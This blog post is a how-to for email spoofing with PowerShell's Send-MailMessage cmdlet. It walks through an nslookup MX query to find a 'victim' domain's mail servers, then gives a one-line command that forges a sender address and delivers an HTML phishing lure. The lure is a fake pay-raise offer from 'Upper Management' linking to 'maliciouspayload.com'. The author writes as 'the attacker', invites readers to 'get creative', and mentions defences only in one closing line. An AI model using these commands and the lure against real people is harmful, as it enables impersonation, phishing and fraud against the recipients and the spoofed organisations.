---
layout: post
title:  "Email Spoofing With Powershell"
author: Michael
categories: [ powershell, spoofing, email ]
image: assets/img/spoofps1.png
featured: false
hidden: false
#subtitle: Excerpt from Soulshaping by Jeff Brown
#cover-img: /assets/img/path.jpg
#thumbnail-img: /assets/img/thumb.png
#share-img: /assets/img/path.jpg
#tags: [books, test]hidden: false
---
<p><img src="/assets/img/spoofps1.png"></p>
I had previously written about <a href="/email-spoofing/netcat">Email Spoofing With Netcat/Telnet<a/> and it was a seemingly instant hit. Even though the same commands were applicable to Windows users through telnet, which is off by default on Windows installations, or netcat if you chose to install it, neither is an immediate “pickup and go” solution. So both of those methods, while native to most Linux distros, require some added effort for Windows users to take advantage of them. While I was doing some research on this, I discovered there’s a built in Powershell cmdlet that allows you to do the same thing on Windows and seemingly much easier in my opinion.
<center><blockquote class="twitter-tweet"><p lang="en" dir="ltr">Powershell has a built in cmdlet called &quot;Send-MailMessage&quot; that makes email spoofing a breeze. One line and you can send HTML, Attachments, High Priority, whatever the heart desires. <a href="https://twitter.com/hashtag/Email?src=hash&amp;ref_src=twsrc%5Etfw">#Email</a> <a href="https://twitter.com/hashtag/EmailSpoofing?src=hash&amp;ref_src=twsrc%5Etfw">#EmailSpoofing</a> <a href="https://twitter.com/hashtag/Spoofing?src=hash&amp;ref_src=twsrc%5Etfw">#Spoofing</a> <a href="https://twitter.com/hashtag/Powershell?src=hash&amp;ref_src=twsrc%5Etfw">#Powershell</a> <a href="https://t.co/lSDYh8tEdg">pic.twitter.com/lSDYh8tEdg</a></p>&mdash; Michael (@The4rchangel) <a href="https://twitter.com/The4rchangel/status/1053047816270995457?ref_src=twsrc%5Etfw">October 18, 2018</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<blockquote>People ended up pretty excited about this cmdlet.</blockquote></center>

#### THE OPTIONS

If you reference the image at the top of the post, you’ll notice this command accepts many different kinds of input. You have all sorts of options including:
<ul>
<li>To:</li>
<li>From:</li>
<li>CC and BCC:</li>
<li>Subject:</li>
<li>SmtpServer:</li>
<li>Port</li>
<li>BodyAsHtml: (renders any HTML code in the body AS HTML)</li>
<li>Attachments</li>
<li>Encoding:</li>
<li>Priotity</li>
<li>and more…</li>
</ul>

#### FINDING AN SMTP SERVER

You can do this on Windows with “nslookup”:
```
PS C:\Users\Archangel> nslookup
Default Server:  REDACTED
Address:  192.168.29.1
> set q=mx
> gmail.com (any victims domain)
Server:  REDACTED
Address:  192.168.29.1
Non-authoritative answer:
gmail.com       MX preference = 30, mail exchanger = alt3.gmail-smtp-in.l.google.com
gmail.com       MX preference = 40, mail exchanger = alt4.gmail-smtp-in.l.google.com
gmail.com       MX preference = 5, mail exchanger = gmail-smtp-in.l.google.com
gmail.com       MX preference = 10, mail exchanger = alt1.gmail-smtp-in.l.google.com
gmail.com       MX preference = 20, mail exchanger = alt2.gmail-smtp-in.l.google.com
>
```
<blockquote> Any of the text following a '>' was typed by myself (the attacker)</blockquote>
Any of the “Mail Exchanger” servers will be SMTP servers you can try for the domain.

#### CRAFTING THE EMAIL

Here’s an example of some of the components of the in this cmdlet used to make craft an email:
```
Send-MailMessage -SmtpServer mail.contoso.com -Port 25 -To victim@contoso.com -From imtheboss@contoso.com -Priority High -Subject "Pay Raise" -BodyAsHtml -Body "Dear Michael, <br><br> We have decided to offer you a 90% pay raise. Please follow this link to confirm your interest and initiate the updated payroll: <a href='maliciouspayload.com'> Confirm Raise </a>. <br><br> Thank you, <br> Upper Management"
```
<p><center><img src="/assets/img/spoofps2.jpeg"></center></p>
There are also plenty of other options available to you, as seen from the Get-Help text at the top. Feel free to get creative! Hopefully your mail admin has the measures in place to prevent this.
